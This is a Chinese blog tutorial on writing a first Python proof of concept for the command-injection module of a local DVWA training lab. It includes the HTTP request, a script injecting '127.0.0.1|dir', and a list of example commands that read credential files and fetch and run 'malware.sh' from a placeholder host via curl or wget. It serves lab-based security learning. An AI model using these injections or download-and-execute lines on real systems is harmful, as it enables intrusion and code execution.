# 原创
：  python攻防---初次编写poc

# python攻防---初次编写poc

**Python攻防—初次编写poc**<br/> 今天在hvv，rt可能因为周末没有多少告警研判，没什么事情做，作为一名蓝队高级工程师（狗头）！我不想做脚本小子了，就来简单的写一个poc入门吧，关注一下，后续还会陆续更新哦。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3963d26cf7304de6af1710c96aa0a5ea.jpeg"/>

本地搭建DVWA靶场，尝试给DVWA中的命令执行模块写一个poc

```
ping 127.0.0.1 | dir

```

这里应该是php版本导致的乱码，没有什么影响。

### 漏洞原理

dvwa的Command Injection(命令注入) 模块提供了一个ping的功能，如果对输入的参数检查不严格就能导致任意命令执行。<br/> 观察源码：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4243e85b808742cbbe2b2e11475a263e.png"/><br/> 传入的ip参数没有做任何过滤被带入命令执行函数shell_exec，利用linux/win命令特性拼接参数 ping ip | dir<br/> 大家写的时候可以根据目标的系统选择命令执行函数。以下是一些常用的和有用的命令示例：

```
whoami： 这个命令用于显示当前用户的用户名。

id： 该命令显示当前用户和用户组的标识信息。

uname -a： 这个命令会显示系统的详细信息，包括操作系统类型、版本和内核信息。

ls 或 dir（视操作系统而定）： 这些命令用于列出当前目录中的文件和文件夹。

pwd 或 cd（视操作系统而定）： 这些命令分别用于显示当前工作目录的路径和切换目录。

cat /etc/passwd 或 type C:\Windows\System32\config\SYSTEM（视操作系统而定）： 这些命令用于读取系统文件，通常包含用户信息。

curl http://xxx.com/malware.sh | sh： 这个命令会从恶意站点下载并执行一个脚本，这可能会导致恶意代码的执行。

wget http://xxx.com/malware.sh -O - | sh： 类似于上面的命令，使用 wget 下载并执行一个脚本。

```

后端实际执行了`shell_exec('ping 127.0.0.1|dir' )`

### 编写poc

2.1 先分析靶场的http数据包。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/84169b37c1234b52855f0e3fbebd59ac.png"/>

/vulnerabilities/exec/ 是接口，通过POST方式通信 ，HOST是 127.0.0.1

```
POST /DVWA/vulnerabilities/exec/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/DVWA/vulnerabilities/exec/
Cookie: security=low; PHPSESSID=b0hva9i7nt3vl6neop9k032th1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

ip=ping+127.0.0.1+%7C+dir&amp;Submit=Submit

```

**2.2** 开始编写代码，pycharm，启动！

**2.2.1** 先导入requests库，这是编写poc中一个流行的HTTP请求库，用于向Web服务器发送HTTP请求以及处理响应。

```
import requests

```

**2.2.2** 定义目标URL和数据以及headers信息，如果没有加入cookie可能会导致重定向到登录页面。

```
url = "http://127.0.0.1/DVWA/vulnerabilities/exec/"  # 这一行定义了目标URL，它是你要测试的漏洞是否存在的网页地址。
headers = {"cookie": "security=low; PHPSESSID=b0hva9i7nt3vl6neop9k032th1"}  # 这一行定义了请求头部，其中包含了一个 Cookie，用于在请求中传递会话标识符。
data = {"ip": "127.0.0.1|dir", "Submit":   "Submit"}  # 这里定义了一个字典data，其中包含了一个名为"ip"的参数，其值为"127.0.0.1"。这个参数将被POST请求发送到目标URL。

```

**2.2.3** 发送post请求并打印出需要的内容

```
response = requests.post(url, data, allow_redirects=False, headers=headers) #  这一行发送了一个 POST 请求到目标 URL，使用了上述定义的请求数据和请求头部。allow_redirects=False 参数告诉 requests 库不要自动处理重定向。
print("状态码: {}".format(response.status_code)) # 这一行打印了服务器返回的 HTTP 状态码，以显示请求的结果。
print("页面内容：{}".format(response.text)) # 这一行打印了服务器返回的响应内容，这是响应的主体部分，可能包含了命令执行的输出。
if "Location" in response.headers: # 这一行检查响应头部中是否包含 "Location" 字段，以判断是否有重定向发生。
    print("302跳转地址：{}".format(response.headers["Location"])) # 如果有重定向发生，这一行将打印出重定向地址。

```

**2.2.4** 完整代码：

```
import requests

url = "http://127.0.0.1/DVWA/vulnerabilities/exec/"  # 这一行定义了目标URL，它是你要测试的漏洞是否存在的网页地址。
headers = {"cookie": "security=low; PHPSESSID=b0hva9i7nt3vl6neop9k032th1"}  # 这一行定义了请求头部，其中包含了一个 Cookie，用于在请求中传递会话标识符。
data = {"ip": "127.0.0.1|dir", "Submit":   "Submit"}  # 这里定义了一个字典data，其中包含了一个名为"ip"的参数，其值为"127.0.0.1"。这个参数将被POST请求发送到目标URL。

response = requests.post(url, data, allow_redirects=False, headers=headers) #  这一行发送了一个 POST 请求到目标 URL，使用了上述定义的请求数据和请求头部。allow_redirects=False 参数告诉 requests 库不要自动处理重定向。
print("状态码: {}".format(response.status_code)) # 这一行打印了服务器返回的 HTTP 状态码，以显示请求的结果。
print("页面内容：{}".format(response.text)) # 这一行打印了服务器返回的响应内容，这是响应的主体部分，可能包含了命令执行的输出。
if "Location" in response.headers: # 这一行检查响应头部中是否包含 "Location" 字段，以判断是否有重定向发生。
    print("302跳转地址：{}".format(response.headers["Location"])) # 如果有重定向发生，这一行将打印出重定向地址。

```

这样打印出来的是整个页面的代码，我们修改一下只打印出命令执行的内容方便渗透测试人员判断是否存在漏洞。可以使用bs4库爬取pre标签的内容。pre标签内就是命令执行的内容。

```
import requests
from bs4 import BeautifulSoup

url = "http://127.0.0.1/DVWA/vulnerabilities/exec/"  # 这一行定义了目标URL，它是你要测试的漏洞是否存在的网页地址。
headers = {"cookie": "security=low; PHPSESSID=b0hva9i7nt3vl6neop9k032th1"}  # 这一行定义了请求头部，其中包含了一个 Cookie，用于在请求中传递会话标识符。
data = {"ip": "127.0.0.1|dir", "Submit":   "Submit"}  # 这里定义了一个字典data，其中包含了一个名为"ip"的参数，其值为"127.0.0.1"。这个参数将被POST请求发送到目标URL。

response = requests.post(url, data, allow_redirects=False, headers=headers) #  这一行发送了一个 POST 请求到目标 URL，使用了上述定义的请求数据和请求头部。allow_redirects=False 参数告诉 requests 库不要自动处理重定向。
print("状态码: {}".format(response.status_code)) # 这一行打印了服务器返回的 HTTP 状态码，以显示请求的结果。

if "Location" in response.headers: # 这一行检查响应头部中是否包含 "Location" 字段，以判断是否有重定向发生。
    print("302跳转地址：{}".format(response.headers["Location"])) # 如果有重定向发生，这一行将打印出重定向地址。

soup = BeautifulSoup(response.text, 'html.parser') # 引入了 BeautifulSoup，这是一个用于解析 HTML 的库。
pre_tags = soup.find_all("pre") # 找到了所有的 &lt;pre&gt; 标签
for pre in pre_tags: # 循环遍历每个 &lt;pre&gt; 标签，并使用 pre.text 提取其文本内容并打印
    print("代码执行结果：")
    print(pre.text)

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9771ec026e1646179563544688c70b2a.png"/>通过考虑异常处理，输出格式和输出前缀等因素，代码还可以更加完善。<br/> **2.2.5** 完善后的最终代码

```
import requests
from bs4 import BeautifulSoup

url = "http://127.0.0.1/DVWA/vulnerabilities/exec/"
headers = {"cookie": "security=low; PHPSESSID=b0hva9i7nt3vl6neop9k032th1"}
data = {"ip": "127.0.0.1|dir", "Submit": "Submit"}

try:
    response = requests.post(url, data=data, allow_redirects=False, headers=headers, timeout=5)
    print("状态码: {}".format(response.status_code))

    if "Location" in response.headers:
        print("302跳转地址：{}".format(response.headers["Location"]))

    soup = BeautifulSoup(response.text, 'html.parser')
    pre_tags = soup.find_all("pre")

    if pre_tags:
        print("漏洞存在，代码执行结果：")
        for index, pre in enumerate(pre_tags):
            print(f"结果 {index + 1}:")
            print(pre.text)
    else:
        print("页面不存在漏洞")
except Exception as e:
    print("发生异常：", e)

```

运行结果：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/024fbe0421b648c3a6aeb285465ca5c2.png"/><br/> 完结，撒花，写完后瞬间感觉自己不是只会点鼠标的猴子了，现在变成了又会点鼠标又会敲键盘的猴子…
